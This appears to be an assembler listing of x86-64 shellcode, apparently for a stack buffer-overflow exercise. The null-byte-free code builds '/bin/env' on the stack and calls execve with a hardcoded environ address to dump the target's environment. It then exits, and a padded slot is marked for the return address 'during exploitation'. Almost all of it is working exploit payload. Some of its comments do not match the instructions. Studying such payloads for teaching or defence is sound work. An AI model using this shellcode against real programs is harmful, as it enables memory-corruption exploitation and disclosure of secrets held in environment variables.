     1                                            bits 64
     2                                              ; find out where we are
     3                                  start:     ; your code starts here
     4                                  
     5                                      ; Step 1 Setup "/bin/env" String
     6                                  
     7                                      ; Clear rax to use as a null terminator
     8 00000000 4831C0                      xor rax, rax
     9                                  
    10                                      ; Push null byte (0x00) onto the stack
    11 00000003 50                          push rax
    12                                  
    13                                      ; Push the string "/bin/env" onto the stack in reverse order 0x766e652f6e69622f
    14 00000004 48BB2F62696E2F656E-         mov rbx, '/bin/env'
    14 0000000D 76                 
    15 0000000E 53                          push rbx
    16                                  
    17                                      ; Set rdi to point to "/bin/env" on the stack
    18 0000000F 4889E7                      mov rdi, rsp
    19                                  
    20                                      ; Step 2 Setup argv Array
    21                                  
    22                                      ; Push null terminator for argv
    23 00000012 50                          push rax
    24                                  
    25                                      ; Push pointer to "/bin/env" as argv[0]
    26 00000013 57                          push rdi
    27                                  
    28                                      ; Set rsi to point to argv array
    29 00000014 4889E6                      mov rsi, rsp
    30                                  
    31                                      ; Step 3 Setup rdx with environ Address
    32                                  
    33                                      ; Clear rdx to start building the address without null bytes
    34 00000017 4831D2                      xor rdx, rdx
    35                                  
    36                                      ; Load lower 16 bits with part of environ address 0xfbe6
    37 0000001A 66BAFF7F                    mov dx, 0x7fff
    38                                  
    39                                      ; Shift rdx left by 32 bits to make space for the higher part
    40 0000001E 48C1E220                    shl rdx, 32
    41                                  
    42                                      ; Load lower 32 bits of rcx with the remaining part of environ address
    43 00000022 B9AAE6FBF7                  mov ecx, 0xf7fbe6aa
    44                                  
    45                                      ; Clear lower 8 bits of rcx to avoid null bytes
    46 00000027 30C9                        xor cl, cl
    47                                  
    48                                      ; Combine rdx and rcx to form the full environ address
    49 00000029 4809CA                      or rdx, rcx
    50                                  
    51                                      ; Dereference rdx to get the address of environ
    52 0000002C 488B12                      mov rdx, [rdx]
    53                                  
    54                                      ; Step 4 Execute execve("/bin/env", argv, environ)
    55                                  
    56                                      ; Set rax to 59 (0x3B) 
    57 0000002F B03B                        mov al, 0x3b
    58                                  
    59                                      ; Make the syscall
    60 00000031 0F05                        syscall
    61                                  
    62                                      ; Step 5 Exit Cleanly
    63                                  
    64                                      ; Move the return value of execve to rdi (exit code)
    65 00000033 4889C7                      mov rdi, rax
    66                                  
    67                                      ; Set rax to 0x3C for exit system call
    68 00000036 B03C                        mov al, 0x3c
    69                                  
    70                                      ; Make the syscall
    71 00000038 0F05                        syscall
    72                                  
    73                                      ; Step 6 Reserved Space
    74                                  
    75                                      ; Reserve space for the return address
    76 0000003A FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff  ; Replace with actual return address during exploitation
    77 00000042 FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff
    78 0000004A FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff
    79 00000052 FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff
    80 0000005A FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff
    81 00000062 62000000                    end: dd end-start
